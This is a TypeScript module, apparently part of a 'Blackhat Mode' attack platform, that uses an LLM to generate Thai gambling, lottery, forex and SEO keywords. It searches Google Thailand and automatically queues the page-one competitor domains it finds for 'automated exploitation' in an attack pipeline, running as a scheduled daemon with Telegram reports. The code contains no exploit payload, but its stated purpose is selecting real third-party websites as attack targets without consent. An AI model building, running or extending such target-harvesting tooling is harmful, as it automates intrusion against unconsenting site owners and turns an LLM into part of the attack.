/**
 * Google Thailand SERP Harvester
 * 
 * AI-powered autonomous system that:
 *   1. Uses LLM to generate fresh keywords per niche/industry
 *   2. Searches Google.co.th via SerpAPI (Top 10 page 1 results)
 *   3. Extracts competitor domains from SERP results
 *   4. Auto-imports into serpDiscoveredTargets → attack pipeline
 *   5. Tracks harvest history and keyword rotation
 * 
 * Designed for Blackhat Mode — feeds competitor domains directly
 * into the attack queue for automated exploitation.
 * 
 * Runs as autonomous agent in orchestrator with configurable interval.
 */

import { getDb } from "./db";
import { serpDiscoveredTargets, serpKeywords } from "../drizzle/schema";
import { eq, sql, inArray, desc } from "drizzle-orm";
import { searchGoogle, type SerpResult, type SerpData } from "./serp-api";
import { isBlacklisted, isOwnRedirectUrl } from "./attack-blacklist";
import { getRedirectUrls } from "./agentic-attack-engine";
import { invokeLLMWithFallback } from "./llm-fallback";
import { sendTelegramNotification } from "./telegram-notifier";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface HarvesterNiche {
  id: string;
  name: string;
  nameEn: string;
  description: string;
  seedKeywords: string[];
  language: string;
  country: string;
  enabled: boolean;
}

export interface HarvestConfig {
  /** Which niches to harvest (default: all enabled) */
  nicheIds?: string[];
  /** Max keywords to generate per niche per cycle */
  keywordsPerNiche?: number;
  /** Max SERP results to process per keyword (1-10 for page 1) */
  maxResultsPerKeyword?: number;
  /** Delay between SerpAPI calls in ms */
  delayBetweenSearches?: number;
  /** Auto-queue for attack (default: true) */
  autoQueueForAttack?: boolean;
  /** Send Telegram notification (default: true) */
  telegramNotify?: boolean;
  /** Triggered by */
  triggeredBy?: string;
  /** Progress callback */
  onProgress?: (phase: string, detail: string, progress: number) => void;
}

export interface HarvestResult {
  harvestId: string;
  startedAt: number;
  completedAt: number;
  duration: number;
  // Keyword generation
  nichesProcessed: number;
  keywordsGenerated: number;
  keywordsSearched: number;
  // Domain extraction
  rawDomainsFound: number;
  uniqueDomainsFound: number;
  newDomainsImported: number;
  duplicatesSkipped: number;
  blacklistedSkipped: number;
  // Details
  domainsPerNiche: Record<string, number>;
  topDomains: Array<{ domain: string; keyword: string; position: number; niche: string }>;
  errors: string[];
  status: "completed" | "partial" | "error";
}

// ═══════════════════════════════════════════════════════
//  NICHE REGISTRY — Configurable target industries
// ═══════════════════════════════════════════════════════

const DEFAULT_NICHES: HarvesterNiche[] = [
  {
    id: "gambling",
    name: "การพนันออนไลน์",
    nameEn: "Online Gambling",
    description: "คาสิโน สล็อต แทงบอล พนันออนไลน์",
    seedKeywords: ["คาสิโนออนไลน์", "สล็อตออนไลน์", "แทงบอลออนไลน์", "เว็บพนัน", "บาคาร่า"],
    language: "th",
    country: "th",
    enabled: true,
  },
  {
    id: "lottery",
    name: "หวยออนไลน์",
    nameEn: "Online Lottery",
    description: "หวย ลอตเตอรี่ เลขเด็ด",
    seedKeywords: ["หวยออนไลน์", "ตรวจหวย", "เว็บหวย", "แทงหวย", "หวยลาว"],
    language: "th",
    country: "th",
    enabled: true,
  },
  {
    id: "forex",
    name: "Forex & Trading",
    nameEn: "Forex Trading",
    description: "เทรด forex หุ้น คริปโต",
    seedKeywords: ["เทรด forex", "สอนเทรด", "โบรกเกอร์ forex", "เทรดคริปโต", "หุ้นออนไลน์"],
    language: "th",
    country: "th",
    enabled: true,
  },
  {
    id: "adult",
    name: "เว็บผู้ใหญ่",
    nameEn: "Adult Content",
    description: "เว็บผู้ใหญ่ ดูหนัง",
    seedKeywords: ["หนังออนไลน์", "ดูหนังฟรี", "เว็บดูหนัง"],
    language: "th",
    country: "th",
    enabled: false,
  },
  {
    id: "seo_services",
    name: "SEO Services",
    nameEn: "SEO Services Thailand",
    description: "บริการ SEO รับทำ SEO",
    seedKeywords: ["รับทำ SEO", "บริษัท SEO", "SEO ราคาถูก", "รับทำเว็บ SEO", "SEO Thailand"],
    language: "th",
    country: "th",
    enabled: true,
  },
  {
    id: "ecommerce",
    name: "E-Commerce",
    nameEn: "E-Commerce Thailand",
    description: "ร้านค้าออนไลน์ ขายของออนไลน์",
    seedKeywords: ["ร้านค้าออนไลน์", "ขายของออนไลน์", "เปิดร้านออนไลน์", "สร้างเว็บขายของ"],
    language: "th",
    country: "th",
    enabled: false,
  },
];

// In-memory niche registry (mutable)
let nicheRegistry: HarvesterNiche[] = JSON.parse(JSON.stringify(DEFAULT_NICHES));

// Track used keywords to avoid repetition
const usedKeywordsCache = new Set<string>();
const MAX_USED_CACHE = 5000;

// Harvest history
const harvestHistory: HarvestResult[] = [];

// ═══════════════════════════════════════════════════════
//  NICHE MANAGEMENT
// ═══════════════════════════════════════════════════════

export function getNiches(): HarvesterNiche[] {
  return [...nicheRegistry];
}

export function getEnabledNiches(): HarvesterNiche[] {
  return nicheRegistry.filter(n => n.enabled);
}

export function updateNiche(nicheId: string, updates: Partial<HarvesterNiche>): boolean {
  const idx = nicheRegistry.findIndex(n => n.id === nicheId);
  if (idx === -1) return false;
  nicheRegistry[idx] = { ...nicheRegistry[idx], ...updates };
  return true;
}

export function addNiche(niche: HarvesterNiche): boolean {
  if (nicheRegistry.some(n => n.id === niche.id)) return false;
  nicheRegistry.push(niche);
  return true;
}

export function toggleNiche(nicheId: string, enabled: boolean): boolean {
  return updateNiche(nicheId, { enabled });
}

// ═══════════════════════════════════════════════════════
//  SKIP DOMAINS — Never target these
// ═══════════════════════════════════════════════════════

const SKIP_DOMAINS = new Set([
  "google.com", "google.co.th", "google.co.jp",
  "youtube.com", "facebook.com", "twitter.com", "x.com",
  "instagram.com", "tiktok.com", "line.me",
  "wikipedia.org", "amazon.com", "microsoft.com", "apple.com",
  "github.com", "stackoverflow.com", "reddit.com",
  "sanook.com", "pantip.com", "kapook.com", "thairath.co.th",
  "dailynews.co.th", "matichon.co.th", "bangkokpost.com",
  "khaosod.co.th", "prachachat.net", "mgronline.com",
  "glo.or.th", "mof.go.th", "bot.or.th",
  "shopee.co.th", "lazada.co.th", "grab.com",
  "manus.im", "manus.space", "domainslayer.ai",
]);

function shouldSkipDomain(domain: string): boolean {
  const clean = domain.toLowerCase().replace(/^www\./, "");
  const skipArr = Array.from(SKIP_DOMAINS);
  for (const skip of skipArr) {
    if (clean === skip || clean.endsWith(`.${skip}`)) return true;
  }
  return false;
}

function extractDomain(url: string): string {
  try {
    const parsed = new URL(url.startsWith("http") ? url : `https://${url}`);
    return parsed.hostname.toLowerCase().replace(/^www\./, "");
  } catch {
    return url.replace(/^https?:\/\//, "").split("/")[0].split(":")[0].toLowerCase().replace(/^www\./, "");
  }
}

// ═══════════════════════════════════════════════════════
//  AI KEYWORD GENERATOR — LLM creates fresh keywords
// ═══════════════════════════════════════════════════════

/**
 * Use LLM to generate fresh keywords for a niche
 * Avoids previously used keywords for rotation
 */
export async function generateKeywordsForNiche(
  niche: HarvesterNiche,
  count: number = 10,
): Promise<string[]> {
  // Build exclusion list from cache
  const recentUsed = Array.from(usedKeywordsCache).slice(-200);
  const excludeList = recentUsed.length > 0
    ? `\n\nDO NOT generate any of these keywords (already used):\n${recentUsed.slice(-50).join(", ")}`
    : "";

  const prompt = `You are a Thai SEO keyword researcher. Generate ${count} NEW and UNIQUE Thai keywords for the "${niche.name}" (${niche.nameEn}) niche.

Industry: ${niche.description}
Seed keywords for reference: ${niche.seedKeywords.join(", ")}
Target: Google Thailand (google.co.th)
Language: Thai (ภาษาไทย)
${excludeList}

Requirements:
- Keywords MUST be in Thai language (ภาษาไทย) — some can include English brand names
- Mix of: short-tail (1-2 words), long-tail (3-5 words), question-based
- Include trending/seasonal variations
- Include misspellings and colloquial terms Thai users actually search
- Focus on keywords that REAL Thai users type into Google
- Each keyword should be something with actual search volume

Return ONLY a JSON array of strings, nothing else.
Example: ["keyword1", "keyword2", "keyword3"]`;

  try {
    const response = await invokeLLMWithFallback({
      messages: [
        { role: "system", content: "You are a Thai SEO keyword research expert. Return only valid JSON arrays." },
        { role: "user", content: prompt },
      ],
    });

    const rawContent = response?.choices?.[0]?.message?.content || "[]";
    const content = typeof rawContent === "string" ? rawContent : "[]";
    // Extract JSON array from response
    const match = content.match(/\[[\s\S]*?\]/);
    if (!match) return niche.seedKeywords.slice(0, count);

    const keywords: string[] = JSON.parse(match[0]);
    const filtered = keywords
      .filter((k): k is string => typeof k === "string" && k.trim().length > 0)
      .filter(k => !usedKeywordsCache.has(k.toLowerCase().trim()))
      .slice(0, count);

    // Add to used cache
    for (const k of filtered) {
      usedKeywordsCache.add(k.toLowerCase().trim());
      if (usedKeywordsCache.size > MAX_USED_CACHE) {
        // Remove oldest entries
        const arr = Array.from(usedKeywordsCache);
        for (let i = 0; i < 1000; i++) usedKeywordsCache.delete(arr[i]);
      }
    }

    console.log(`[SerpHarvester] AI generated ${filtered.length} keywords for niche "${niche.id}"`);
    return filtered.length > 0 ? filtered : niche.seedKeywords.slice(0, count);
  } catch (err: any) {
    console.warn(`[SerpHarvester] LLM keyword generation failed: ${err.message}, using seed keywords`);
    return niche.seedKeywords.slice(0, count);
  }
}

// ═══════════════════════════════════════════════════════
//  SERP SCRAPER — Search Google.co.th and extract domains
// ═══════════════════════════════════════════════════════

export interface SerpPageOneResult {
  keyword: string;
  niche: string;
  domains: Array<{
    domain: string;
    url: string;
    title: string;
    snippet: string;
    position: number;
  }>;
  totalResults: number | null;
  relatedSearches: string[];
  error?: string;
}

/**
 * Search a keyword on Google.co.th and extract page 1 domains
 */
export async function scrapeGoogleThailand(
  keyword: string,
  nicheId: string,
  maxResults: number = 10,
): Promise<SerpPageOneResult> {
  const result: SerpPageOneResult = {
    keyword,
    niche: nicheId,
    domains: [],
    totalResults: null,
    relatedSearches: [],
  };

  try {
    const serpData = await searchGoogle(keyword, {
      gl: "th",       // Google Thailand
      hl: "th",       // Thai language
      num: maxResults, // Page 1 only (top 10)
    });

    if (!serpData) {
      result.error = "SerpAPI returned null (API key missing or rate limited)";
      return result;
    }

    result.totalResults = serpData.totalResults;
    result.relatedSearches = serpData.relatedSearches;

    // Extract domains from organic results
    const seenDomains = new Set<string>();
    for (const r of serpData.results) {
      if (r.position > maxResults) break; // Only page 1

      const domain = extractDomain(r.link);
      if (!domain || shouldSkipDomain(domain)) continue;
      if (seenDomains.has(domain)) continue;
      seenDomains.add(domain);

      result.domains.push({
        domain,
        url: r.link,
        title: r.title,
        snippet: r.snippet,
        position: r.position,
      });
    }
  } catch (err: any) {
    result.error = err.message;
  }

  return result;
}

// ═══════════════════════════════════════════════════════
//  MAIN HARVEST ENGINE — Full autonomous cycle
// ═══════════════════════════════════════════════════════

/**
 * Run a full harvest cycle:
 * 1. For each enabled niche → AI generates keywords
 * 2. Search each keyword on Google.co.th
 * 3. Extract page 1 domains
 * 4. Dedup + blacklist filter
 * 5. Insert into serpDiscoveredTargets (queued for attack)
 * 6. Telegram notification
 */
export async function runHarvestCycle(
  config: HarvestConfig = {},
): Promise<HarvestResult> {
  const {
    nicheIds,
    keywordsPerNiche = 8,
    maxResultsPerKeyword = 10,
    delayBetweenSearches = 3000,
    autoQueueForAttack = true,
    telegramNotify = true,
    triggeredBy = "manual",
    onProgress,
  } = config;

  const harvestId = `harvest-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
  const startedAt = Date.now();

  const result: HarvestResult = {
    harvestId,
    startedAt,
    completedAt: 0,
    duration: 0,
    nichesProcessed: 0,
    keywordsGenerated: 0,
    keywordsSearched: 0,
    rawDomainsFound: 0,
    uniqueDomainsFound: 0,
    newDomainsImported: 0,
    duplicatesSkipped: 0,
    blacklistedSkipped: 0,
    domainsPerNiche: {},
    topDomains: [],
    errors: [],
    status: "completed",
  };

  try {
    const db = await getDb();
    if (!db) throw new Error("Database not available");

    // Determine which niches to process
    const targetNiches = nicheIds
      ? nicheRegistry.filter(n => nicheIds.includes(n.id) && n.enabled)
      : getEnabledNiches();

    if (targetNiches.length === 0) {
      result.errors.push("No enabled niches found");
      result.status = "error";
      return result;
    }

    onProgress?.("init", `Starting harvest for ${targetNiches.length} niches`, 2);

    // Get existing domains for dedup
    const existingTargets = await db.select({ domain: serpDiscoveredTargets.domain })
      .from(serpDiscoveredTargets);
    const existingDomains = new Set(existingTargets.map(t => t.domain.toLowerCase()));

    // Get redirect URLs for self-attack prevention
    let redirectUrls: string[] = [];
    try {
      redirectUrls = await getRedirectUrls();
    } catch { /* ignore */ }

    // All discovered domains across all niches
    const allNewDomains: Array<{
      domain: string;
      url: string;
      title: string;
      snippet: string;
      position: number;
      keyword: string;
      niche: string;
    }> = [];

    let totalKeywordsToSearch = targetNiches.length * keywordsPerNiche;
    let keywordsProcessed = 0;

    // Process each niche
    for (const niche of targetNiches) {
      const nicheStart = Date.now();
      result.nichesProcessed++;
      result.domainsPerNiche[niche.id] = 0;

      onProgress?.("keywords", `[${niche.name}] Generating AI keywords...`, 
        Math.round((keywordsProcessed / totalKeywordsToSearch) * 80) + 5);

      // Step 1: AI generates keywords for this niche
      const keywords = await generateKeywordsForNiche(niche, keywordsPerNiche);
      result.keywordsGenerated += keywords.length;

      console.log(`[SerpHarvester] Niche "${niche.id}": ${keywords.length} keywords → ${keywords.slice(0, 5).join(", ")}...`);

      // Step 2: Search each keyword on Google.co.th
      for (const keyword of keywords) {
        keywordsProcessed++;
        const pct = Math.round((keywordsProcessed / totalKeywordsToSearch) * 80) + 5;
        onProgress?.("search", `[${niche.name}] Searching: "${keyword}"`, pct);

        const serpResult = await scrapeGoogleThailand(keyword, niche.id, maxResultsPerKeyword);
        result.keywordsSearched++;

        if (serpResult.error) {
          result.errors.push(`[${niche.id}] "${keyword}": ${serpResult.error}`);
          continue;
        }

        result.rawDomainsFound += serpResult.domains.length;

        // Collect domains
        for (const d of serpResult.domains) {
          const domainLower = d.domain.toLowerCase();

          // Check existing
          if (existingDomains.has(domainLower)) {
            result.duplicatesSkipped++;
            continue;
          }

          // Check blacklist
          try {
            const blResult = await isBlacklisted(d.domain);
            if (blResult.blacklisted) {
              result.blacklistedSkipped++;
              continue;
            }
          } catch {
            // If blacklist check fails, still try to add
          }

          // Check self-redirect
          try {
            const isSelf = await isOwnRedirectUrl(d.url, redirectUrls);
            if (isSelf) {
              result.blacklistedSkipped++;
              continue;
            }
          } catch { /* ignore */ }

          // New domain found!
          allNewDomains.push({
            domain: d.domain,
            url: d.url,
            title: d.title,
            snippet: d.snippet,
            position: d.position,
            keyword,
            niche: niche.id,
          });

          existingDomains.add(domainLower); // Prevent duplicates within same run
          result.domainsPerNiche[niche.id] = (result.domainsPerNiche[niche.id] || 0) + 1;
        }

        // Also seed related searches as new keywords for future cycles
        if (serpResult.relatedSearches.length > 0) {
          await seedRelatedKeywords(niche, serpResult.relatedSearches);
        }

        // Respect SerpAPI rate limits
        if (keywordsProcessed < totalKeywordsToSearch) {
          await new Promise(resolve => setTimeout(resolve, delayBetweenSearches));
        }
      }

      console.log(`[SerpHarvester] Niche "${niche.id}" done: ${result.domainsPerNiche[niche.id]} new domains (${Date.now() - nicheStart}ms)`);
    }

    // Step 3: Deduplicate by domain (keep best position)
    const domainMap = new Map<string, typeof allNewDomains[0]>();
    for (const d of allNewDomains) {
      const key = d.domain.toLowerCase();
      if (!domainMap.has(key) || d.position < (domainMap.get(key)!.position || 999)) {
        domainMap.set(key, d);
      }
    }
    const uniqueNewDomains = Array.from(domainMap.values());
    result.uniqueDomainsFound = uniqueNewDomains.length;

    onProgress?.("import", `Importing ${uniqueNewDomains.length} new domains...`, 88);

    // Step 4: Insert into DB
    for (let i = 0; i < uniqueNewDomains.length; i += 50) {
      const batch = uniqueNewDomains.slice(i, i + 50);
      const values = batch.map(d => ({
        domain: d.domain,
        url: d.url,
        title: d.title,
        snippet: d.snippet,
        serpPosition: d.position,
        keyword: d.keyword,
        status: autoQueueForAttack ? "queued" as const : "discovered" as const,
      }));

      await db.insert(serpDiscoveredTargets).values(values);
    }

    result.newDomainsImported = uniqueNewDomains.length;

    // Top domains (sorted by position)
    result.topDomains = uniqueNewDomains
      .sort((a, b) => a.position - b.position)
      .slice(0, 20)
      .map(d => ({
        domain: d.domain,
        keyword: d.keyword,
        position: d.position,
        niche: d.niche,
      }));

    onProgress?.("complete", `Harvest complete: ${result.newDomainsImported} new domains`, 100);

    // Step 5: Telegram notification
    if (telegramNotify && result.newDomainsImported > 0) {
      try {
        const nicheBreakdown = Object.entries(result.domainsPerNiche)
          .filter(([_, count]) => count > 0)
          .map(([niche, count]) => `  ${niche}: ${count}`)
          .join("\n");

        const topDomainsPreview = result.topDomains
          .slice(0, 8)
          .map(d => `  #${d.position} ${d.domain} [${d.keyword}]`)
          .join("\n");

        await sendTelegramNotification({
          type: "success",
          targetUrl: `harvest://${harvestId}`,
          details: [
            `🔍 SERP HARVEST COMPLETE`,
            ``,
            `Niches: ${result.nichesProcessed}`,
            `Keywords searched: ${result.keywordsSearched}`,
            `New domains: ${result.newDomainsImported}`,
            `Duplicates skipped: ${result.duplicatesSkipped}`,
            `Blacklisted: ${result.blacklistedSkipped}`,
            ``,
            `Per Niche:`,
            nicheBreakdown,
            ``,
            `Top Domains:`,
            topDomainsPreview,
            ``,
            `Status: ${autoQueueForAttack ? "Queued for attack" : "Discovered"}`,
            `Triggered by: ${triggeredBy}`,
          ].join("\n"),
        });
      } catch (e: any) {
        console.warn(`[SerpHarvester] Telegram notification failed: ${e.message}`);
      }
    }

  } catch (err: any) {
    result.errors.push(err.message);
    result.status = "error";
    console.error(`[SerpHarvester] Harvest cycle failed: ${err.message}`);
  }

  result.completedAt = Date.now();
  result.duration = result.completedAt - result.startedAt;

  // Track in history
  harvestHistory.push(result);
  if (harvestHistory.length > 50) harvestHistory.splice(0, harvestHistory.length - 50);

  console.log(`[SerpHarvester] Cycle complete: ${result.newDomainsImported} new domains in ${Math.round(result.duration / 1000)}s`);
  return result;
}

// ═══════════════════════════════════════════════════════
//  RELATED KEYWORD SEEDING — Auto-expand keyword pool
// ═══════════════════════════════════════════════════════

async function seedRelatedKeywords(niche: HarvesterNiche, relatedSearches: string[]): Promise<void> {
  try {
    const db = await getDb();
    if (!db || relatedSearches.length === 0) return;

    // Get existing keywords
    const existing = await db.select({ keyword: serpKeywords.keyword }).from(serpKeywords);
    const existingSet = new Set(existing.map(e => e.keyword.toLowerCase()));

    let added = 0;
    for (const query of relatedSearches.slice(0, 5)) { // Max 5 related per search
      const clean = query.trim().toLowerCase();
      if (!clean || existingSet.has(clean)) continue;

      await db.insert(serpKeywords).values({
        keyword: query.trim(),
        category: niche.id,
        language: niche.language,
        country: niche.country,
      });
      existingSet.add(clean);
      added++;
    }

    if (added > 0) {
      console.log(`[SerpHarvester] Seeded ${added} related keywords for niche "${niche.id}"`);
    }
  } catch (err: any) {
    // Non-critical, just log
    console.warn(`[SerpHarvester] Failed to seed related keywords: ${err.message}`);
  }
}

// ═══════════════════════════════════════════════════════
//  DAEMON TICK — For orchestrator integration
// ═══════════════════════════════════════════════════════

/**
 * Daemon tick function — called by orchestrator on schedule
 */
export async function serpHarvestTick(): Promise<HarvestResult> {
  console.log(`[SerpHarvester] Daemon tick starting...`);
  return runHarvestCycle({
    keywordsPerNiche: 5,       // Conservative per tick
    maxResultsPerKeyword: 10,  // Full page 1
    delayBetweenSearches: 3000,
    autoQueueForAttack: true,
    telegramNotify: true,
    triggeredBy: "daemon",
  });
}

// ═══════════════════════════════════════════════════════
//  HISTORY & STATS
// ═══════════════════════════════════════════════════════

export function getHarvestHistory(): HarvestResult[] {
  return [...harvestHistory].reverse(); // Newest first
}

export function getHarvestStats(): {
  totalHarvests: number;
  totalDomainsImported: number;
  totalKeywordsSearched: number;
  averageDomainsPerHarvest: number;
  lastHarvestAt: number | null;
  nicheStats: Record<string, number>;
} {
  const total = harvestHistory.reduce((acc, r) => ({
    totalDomainsImported: acc.totalDomainsImported + r.newDomainsImported,
    totalKeywordsSearched: acc.totalKeywordsSearched + r.keywordsSearched,
  }), { totalDomainsImported: 0, totalKeywordsSearched: 0 });

  // Aggregate niche stats
  const nicheStats: Record<string, number> = {};
  for (const r of harvestHistory) {
    for (const [niche, count] of Object.entries(r.domainsPerNiche)) {
      nicheStats[niche] = (nicheStats[niche] || 0) + count;
    }
  }

  return {
    totalHarvests: harvestHistory.length,
    ...total,
    averageDomainsPerHarvest: harvestHistory.length > 0
      ? Math.round(total.totalDomainsImported / harvestHistory.length)
      : 0,
    lastHarvestAt: harvestHistory.length > 0
      ? harvestHistory[harvestHistory.length - 1].completedAt
      : null,
    nicheStats,
  };
}
